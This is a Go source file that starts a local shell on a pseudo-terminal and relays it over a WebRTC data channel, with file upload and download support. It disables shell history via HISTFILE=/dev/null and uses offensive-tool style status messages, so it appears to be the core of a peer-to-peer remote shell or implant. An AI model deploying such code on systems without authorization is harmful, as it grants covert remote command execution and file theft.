//go:build !windows

package main

import (
	"encoding/json"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"

	"github.com/creack/pty"
	"github.com/pion/webrtc/v3"
)

func runShell(dc *webrtc.DataChannel) {
	shell := os.Getenv("SHELL")
	if shell == "" {
		for _, s := range []string{"/bin/bash", "/bin/zsh", "/bin/sh"} {
			if _, err := os.Stat(s); err == nil {
				shell = s
				break
			}
		}
	}
	if shell == "" {
		shell = "/bin/sh"
	}

	cmd := exec.Command(shell)
	cmd.Env = append(os.Environ(),
		"TERM=xterm-256color",
		"HISTFILE=/dev/null",
		"PS1=\\[\\033[01;31m\\][p2p]\\[\\033[00m\\] \\[\\033[01;34m\\]\\w\\[\\033[00m\\]\\$ ",
	)

	ptmx, err := pty.Start(cmd)
	if err != nil {
		fmt.Fprintf(os.Stderr, "[-] pty.Start failed: %v\n", err)
		dc.SendText(fmt.Sprintf("\r\n[-] Failed to start shell: %v\r\n", err)) //nolint:errcheck
		dc.Close()
		return
	}
	defer ptmx.Close()
	fmt.Printf("[+] Shell started: %s (PID %d)\n", shell, cmd.Process.Pid)

	// PTY output → DataChannel
	go func() {
		buf := make([]byte, 4096)
		for {
			n, err := ptmx.Read(buf)
			if n > 0 {
				dc.SendText(string(buf[:n])) //nolint:errcheck
			}
			if err != nil {
				break
			}
		}
		fmt.Printf("[*] Shell exited\n")
		dc.Close()
		os.Exit(0)
	}()

	// Upload state — only accessed from the single OnMessage goroutine.
	var uploadFile *os.File
	var uploadName string

	dc.OnMessage(func(msg webrtc.DataChannelMessage) {
		data := msg.Data
		if len(data) == 0 {
			return
		}

		// Binary message → file upload chunk
		if !msg.IsString {
			if uploadFile != nil {
				uploadFile.Write(data) //nolint:errcheck
			}
			return
		}

		// Control message: prefix 0x01
		if data[0] == 0x01 {
			var ctrl struct {
				Type string `json:"type"`
				Rows uint16 `json:"rows"`
				Cols uint16 `json:"cols"`
				Name string `json:"name"`
				Size int64  `json:"size"`
				Path string `json:"path"`
			}
			if json.Unmarshal(data[1:], &ctrl) != nil {
				return
			}
			switch ctrl.Type {
			case "resize":
				pty.Setsize(ptmx, &pty.Winsize{Rows: ctrl.Rows, Cols: ctrl.Cols}) //nolint:errcheck

			case "exit":
				fmt.Printf("[*] Exit requested by browser\n")
				ptmx.Close()
				dc.Close()
				os.Exit(0)

			case "upload-start":
				destPath := filepath.Join(os.TempDir(), filepath.Base(ctrl.Name))
				f, err := os.Create(destPath)
				if err != nil {
					sendCtrl(dc, map[string]interface{}{"type": "upload-error", "error": err.Error()})
					return
				}
				uploadFile = f
				uploadName = ctrl.Name

			case "upload-end":
				if uploadFile != nil {
					path := uploadFile.Name()
					uploadFile.Close()
					uploadFile = nil
					sendCtrl(dc, map[string]interface{}{
						"type": "upload-ok",
						"name": uploadName,
						"path": path,
					})
					uploadName = ""
				}

			case "download":
				go handleDownload(dc, ctrl.Path)
			}
			return
		}

		// Regular shell input
		ptmx.Write(data) //nolint:errcheck
	})

	dc.OnClose(func() {
		ptmx.Close()
		os.Exit(0)
	})

	cmd.Wait() //nolint:errcheck
}
